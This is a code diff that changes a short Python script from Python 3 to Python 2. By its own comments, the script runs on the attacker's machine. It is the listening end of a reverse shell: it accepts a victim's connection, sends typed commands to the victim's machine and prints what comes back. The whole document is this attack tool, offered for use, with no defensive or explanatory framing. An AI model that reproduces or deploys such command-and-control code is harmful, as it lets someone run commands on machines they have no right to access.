@@ -1,5 +1,5 @@
-#/usr/bin/env python3
-### Use python 3
+#/usr/bin/env python
+### Use python 2
 ### run this file on attacke's machine
 import attacker_info, socket
 
@@ -12,10 +12,10 @@ s.listen(5)                                              # listen at most 5 conn
 (conn, addr) = s.accept()
 
 while True:
-    command = input(">")                            # send command to victims machine
-    conn.send(bytes(command, "utf8"))
+    command = raw_input(">")                            # send command to victims machine
+    conn.send(command)
     if command == "exit":
         break
-    data = conn.recv(2048).decode("utf8")
+    data = conn.recv(2048)
     print(data)
 conn.close()
